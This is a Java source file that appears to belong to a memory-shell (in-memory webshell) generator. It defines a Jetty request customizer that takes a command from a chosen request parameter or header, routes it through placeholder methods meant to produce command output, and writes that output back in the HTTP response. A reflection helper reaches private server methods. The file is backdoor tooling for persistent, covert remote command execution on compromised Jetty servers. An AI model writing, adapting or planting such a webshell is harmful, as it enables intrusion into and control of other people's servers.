package com.reajason.javaweb.memshell.shelltool.command;

import org.eclipse.jetty.server.Connector;
import org.eclipse.jetty.server.HttpConfiguration;
import org.eclipse.jetty.server.Request;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2025/11/29
 */
public class CommandJettyCustomizer implements HttpConfiguration.Customizer {
    private static String paramName;

    public CommandJettyCustomizer() {
    }

    // jetty9+
    public void customize(Connector connector, HttpConfiguration channelConfig, Request request) {
        try {
            String p = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName);
            if (p == null || p.isEmpty()) {
                p = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, paramName);
            }
            if (p != null) {
                String param = getParam(p);
                Object response = invokeMethod(request, "getResponse");
                InputStream inputStream = getInputStream(param);
                OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                outputStream.write(new Scanner(inputStream).useDelimiter("\\A").next().getBytes());
                invokeMethod(request, "setHandled", new Class[]{boolean.class}, new Object[]{true});
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName) {
        return invokeMethod(obj, methodName, null, null);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + (obj instanceof Class ? ((Class<?>) obj).getName() : obj.getClass().getName()) + "." + methodName, e);
        }
    }
}
